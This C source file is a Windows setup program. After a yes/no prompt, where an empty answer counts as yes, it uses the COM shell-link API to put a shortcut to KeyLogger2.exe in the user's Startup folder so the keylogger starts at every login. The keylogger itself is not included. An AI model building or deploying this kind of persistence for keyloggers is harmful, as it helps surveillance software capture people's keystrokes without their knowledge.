// Contributers: Jannis Neuhaus, Andreas Lerch


#define UNICODE
#define _UNICODE

#include <windows.h>
#include <shlobj.h>    // For CSIDL_STARTUP
#include <stdio.h>
#include <shobjidl.h>  // For IShellLink and IPersistFile
#include <objbase.h>   // For CoInitialize and CoUninitialize

void CreateShortcut(LPCWSTR shortcutPath, LPCWSTR targetPath, LPCWSTR description) {
    HRESULT hRes;
    IShellLinkW* pShellLink = NULL;

    // Initialize COM
    hRes = CoInitialize(NULL);
    if (FAILED(hRes)) {
        wprintf(L"COM initialization failed: 0x%X\n", hRes);
        return;
    }

    // Create IShellLink object
    hRes = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**)&pShellLink);
    if (SUCCEEDED(hRes)) {
        // Set target path and description
        pShellLink->lpVtbl->SetPath(pShellLink, targetPath);
        pShellLink->lpVtbl->SetDescription(pShellLink, description);

        // Query IPersistFile interface
        IPersistFile* pPersistFile;
        hRes = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hRes)) {
            // Save the shortcut
            hRes = pPersistFile->lpVtbl->Save(pPersistFile, shortcutPath, TRUE);
            if (SUCCEEDED(hRes)) {
                wprintf(L"Shortcut successfully created: %ls\n", shortcutPath);
            } else {
                wprintf(L"Failed to save the shortcut: 0x%X\n", hRes);
            }
            pPersistFile->lpVtbl->Release(pPersistFile);
        } else {
            wprintf(L"QueryInterface for IPersistFile failed: 0x%X\n", hRes);
        }
        pShellLink->lpVtbl->Release(pShellLink);
    } else {
        wprintf(L"Failed to create IShellLink: 0x%X\n", hRes);
    }

    // Uninitialize COM
    CoUninitialize();
}

void clear_input_buffer() {
    wint_t c;
    while ((c = getwchar()) != L'\n' && c != WEOF);
}

int main() {
    wchar_t choice;

    // User prompt
    do {
        wprintf(L"Do you want to create a shortcut in the startup folder? [y/n]: ");
        choice = getwchar();

        if (choice == L'\n' || choice == WEOF) {
            choice = L'y'; // Default to 'y'
        } else {
            clear_input_buffer(); // Clear input buffer
        }

        if (choice == L'y' || choice == L'Y') {
            wprintf(L"You selected 'Yes'.\n");
            break;
        } else if (choice == L'n' || choice == L'N') {
            wprintf(L"You selected 'No'.\n");
            return 0; // Exit program
        } else {
            wprintf(L"Invalid input. Please enter 'y' or 'n'.\n");
        }
    } while (1);

    // Path of the current .exe (setup.exe)
    WCHAR currentPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        wprintf(L"Error retrieving the current path: %lu\n", GetLastError());
        return 1;
    }

    // Path to KeyLogger2.exe (in the same folder as setup.exe)
    WCHAR KeyInsightPath[MAX_PATH];
    wcscpy_s(KeyInsightPath, MAX_PATH, currentPath);

    WCHAR* lastBackslash = wcsrchr(KeyInsightPath, L'\\');
    if (lastBackslash != NULL) {
        wcscpy_s(lastBackslash + 1, MAX_PATH - (lastBackslash - KeyInsightPath + 1), L"KeyLogger2.exe");
    } else {
        wprintf(L"Error parsing path: %ls\n", KeyInsightPath);
        return 1;
    }

    // Path to the startup folder
    WCHAR startupPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) {
        wprintf(L"Error retrieving the startup folder.\n");
        return 1;
    }

    // Path to the shortcut in startup
    WCHAR shortcutPath[MAX_PATH];
    swprintf_s(shortcutPath, MAX_PATH, L"%s\\KeyLogger2.lnk", startupPath);

    // Create the shortcut
    CreateShortcut(shortcutPath, KeyInsightPath, L"Autostart for KeyLogger2.exe");

    return 0;
}
